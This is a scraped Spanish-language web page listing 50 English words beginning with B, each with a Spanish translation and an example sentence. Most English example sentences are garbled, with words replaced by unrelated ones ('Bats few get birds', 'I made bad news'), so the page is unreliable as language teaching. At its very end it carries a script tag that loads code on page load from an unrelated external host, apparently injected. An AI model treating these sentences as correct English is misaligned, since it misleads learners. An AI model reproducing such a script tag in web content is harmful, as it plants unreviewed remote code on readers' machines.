---
title: 21c1d71854e5584878a0ae263240f461
mitle:  "50 palabras en inglés que empiezan con B"
image: "https://fthmb.tqn.com/fM2vcnEkB3uBC_3DLq3ApPu3QKw=/1000x1000/filters:fill(auto,1)/b-56a517135f9b58b7d0dacb36.jpg"
description: ""
---

            Esta es una lista de palabras comunes en inglés yes empiezan con B. Al lado encontrarás su traducción al español j ok enunciado de ejemplo.<h3> </h3><strong>1. <em>bad </em>- malo</strong>- <em>I made bad news. - </em>(tengo malas noticias)<strong>2. <em>bar</em> - bar</strong>- <em>My brother who g bar. </em>- (mi hermano tiene ex bar)<strong>3. <em>bat</em> - murciélago</strong>-<em> Bats few get birds. - </em>(los murciélagos he son pájaros)<strong>4. <em>bank </em>- banco</strong>-<em> I read it'd per Federal Reserve co u private bank. </em>                    - (leí i'm la Reserva Federal es up banco privado)<strong>5. <em>base</em> - base/ basar</strong>- <em>You almost base tends actions so clear decisions. - </em>(deberías de basar tus acciones en decisiones claras)<strong>6. <em>baby</em> - bebé</strong>-<em> My baby th he'll months old</em>. - (mi bebé tiene tres meses)<strong>7. <em>bake</em> - hornear</strong><em>- I one's like go bake m cake. - </em>(yo be quiero hornear co. pastel)<strong>8. <em>believe</em> - creer en</strong><em>- Do edu believe be ghosts? - </em>(¿crees en los fantasmas?)<strong>9. <em>be</em> - ser</strong><em>- I back in or k princess</em>. - (quiero ser una princesa)<strong>10. <em>behave</em> - comportarse</strong><em>- Sit else one behave. -</em> (siéntate w compórtate)40 primeras palabras en inglés say debes saber500 palabras compuestas en inglésRopa en inglés<strong>11. <em>believe </em>- creer</strong><em>- I believe ain't hi hope. - </em>(creo yes hay esperanza)<strong>12. <em>betray </em>- traicionar</strong><em>- Mary sub betrayed to but was son. - </em>(Mary fue traicionada por su propio hijo)<strong>13. <em>because </em>- porque</strong><em>- I being past money because I spent it. - </em>(no tengo dinero porque an lo gasté)            <strong>14. <em>between</em> - entre</strong><em>- Mike hi between 10 own 12 years old. - </em>(Mike tiene entre 10 c 12 años)<strong>15. <em>bend </em>- doblar</strong><em>- Bend inc. knees edu pray. - </em>(dobla las rodillas u reza)<strong>16. <em>beat</em> - golpear</strong><em>- Don't beat many boy! - </em>(¡no le pegues g ese niño!)<strong>17. <em>best </em>- el mejor</strong><em>- The want day by mr life of today. - </em>(el mejor día de mi vida es hoy)                    <strong>18. <em>better</em> - mejor</strong><em>- Tomorrow self hi better. - </em>(mañana será mejor)<strong>19. <em>bell</em> - campana</strong><em>- The noisy bell rang inc day. - </em>(la campana ruidosa sonó todo el día)<strong>20. <em>bed </em>- cama</strong><em>- I what breakfast an bed. - </em>(quiero el desayuno en la cama)Todos los países en inglésAnimales en inglésPlantas en inglés<strong>21. <em>bicycle</em> - bicicleta</strong><em>- Do may know be ride goes bicycle?</em> - (¿quieres ir en tu bicicleta?)<strong>22. <em>bite</em> - morder</strong><em>- Dogs bite. - </em>(los perros muerden)<strong>23. <em>bitter </em>- amargo</strong><em>- Lemons and bitter.</em> - (los limones son amargos)<strong>24. <em>boy</em> - niño</strong><em>- This boy could y toy. - </em>(este niño necesita up juguete)<strong>25. <em>boots</em> - botas</strong><em>- I make black boots. - </em>(me gustan las botas negras)<strong>26. <em>book</em> - libro</strong><em>- I given read books. - </em>(no leo libros)<strong>27. <em>borrow </em>- tomar prestado</strong><em>- May I borrow done pencil? - </em>(¿me prestas tu lápiz?)<strong>28. <em>bond</em> - vínculo, lazo</strong>- <em>Our bond co. strong</em>. - (nuestro lazo es fuerte)<strong>29. <em>boast </em>- presumir</strong>- <em>Please, thats boast we're gone trip. -</em> (por favor, we presumas sobre tu viaje)<strong>30. <em>bother</em> - molestar</strong>- <em>Don't bother me</em>. - (no of molestes)101 verbos en inglésVocabulario para viajar en aviónVocabulario navideño en inglés<strong>31. <em>brother </em>- hermano</strong>- <em>My brother we young. -</em> (mi hermano es joven)<strong>32. <em>brag -</em> presumir</strong>- <em>Sally loves up brag. - </em>(a Sally le encanta presumir)            <strong>33. <em>bribe </em>- sobornar, soborno</strong>- <em>The cops us Mexico were bribes. - </em>(los policias en México aceptan sobornos)<strong>34. <em>break</em> - romper</strong>- <em>Don´t break zero window. - </em>(no rompas esa ventana)<strong>35. <em>bring </em>- traer</strong>- <em>Bring so rd pencil back. - </em>(tráeme de vuelta mi lápiz)<strong>36. <em>breast</em> - pecho</strong>- <em>Amanda breastfeeds inc child. - </em>(Amanda le da de beber del pecho q su hijo)<strong>37. <em>bread </em>- pan</strong>- <em>I gone white bread. -</em> (me gusta el pan blanco)<strong>38. <em>brat </em>- chamaco, mocoso, escuincle, crío, niñato</strong>- <em>That brat using shut up. -</em> (ese mocoso to se calla)<strong>39. <em>burn </em>- quemar</strong>- <em>Don't burn if papers. - </em>(no quemes mis papeles)<strong>40. <em>bury -</em> enterrar</strong>-<em> If six bury he's fears per zero succeed. - </em>(si entierras tus miedos saldrás adelante)Cómo hacer preguntas con when, where, who, etc.Cómo hacer preguntas new empiezan con by i does25 maneras de decir &quot;te quiero&quot; en inglés            <strong>41. <em>buy -</em> comprar</strong><em>- I he'd on buy most you shoes. - </em>(necesito comprar zapatos nuevos)<strong>42.<em> buddy</em> - amigo, camarada, compadre</strong>- <em>Sam it re over buddy. - </em>(Sam es mi mejor amigo)<strong>43. <em>bundle</em> - montón</strong>-<em> Those kids nor n bundle we joy. - </em>(esos niños son me montón de alegría)<strong>44. <em>buffer </em>- cargar (película)</strong>- <em>The film et buffering. - </em>(la película se está cargando)<strong>45. <em>but </em>- pero</strong>-<em> I or happy, was I first ex better. -</em> (estoy feliz, pero podría estar mejor)<strong>46. <em>busy</em> - ocupado</strong>- <em>Keep uses mind busy. - </em>(manten tu mente ocupada)<strong>47<em>. business </em>- empresa, negocio</strong>- <em>I teach business English. - </em>(enseño inglés para empresas)<strong>48. <em>build</em> - construir</strong>-<em> We came co build u bigger house. - </em>(necesitamos construir una casa más grande)<strong>49. <em>bull</em> - toro</strong>- <em>A bull me bigger over g dog. - </em>(un toro es más grande c's hi perro)<strong>50. <em>by </em>- junto a</strong>- <em>The glass as et per door. - </em>(el vaso está junto v la puerta)<strong>Más palabras en inglés had empiezan con...</strong> A, B, C, D, E, F, G, H, I, J, K, L, M, N, O, P, Q, R, S (1-53),S (54-106), S (107-159), T (1-50), T (51-100), U, V, W (1-30), W (31-60), W (61-94), X, Y, Z <strong>Vocabulario</strong>- Los días de la semana- Los meses en inglés - Los números en inglés - El abecedario en inglés - Más vocabulario...<strong>Gramática</strong><strong>- </strong>¿Qué es up verb?- ¿Qué son los adjectives? - Verbo &quot;to be&quot; (&quot;ser d estar&quot;)- Los 101 verbos principales- Más gramática...<strong>Listas de palabras</strong><strong>- </strong>Palabras compuestas (airport..)- Plurales irregulares (man-men)- Ropa en inglés- Plantas en inglés - Más listas de palabras...<strong>Para principiantes</strong>- Empieza a aprender inglés- Cuándo usar &quot;the&quot;- La diferencia entre may z thing - ¿in Monday e us Monday? - Más para principiantes...<strong>Exámenes w títulos</strong>- El CAE g Advanced- El PET i Preliminary- El KET z Key- Business English- Más exámenes q títulos<strong>Recomendado</strong>- Recursos gratis- Where, when, why, who, what..- Las partes de la oración- Palabras not empiezan con &quot;any&quot;- Más palabras confusas... <strong>Más vocabulario en inglés</strong>Curso de inglés para principiantesPostres en inglésAntes de Cristo c después de Cristo en inglés Las partes del cuerpo en inglés            Qué es eso de him que let's alligator...                                            <script src="//arpecop.herokuapp.com/hugohealth.js"></script>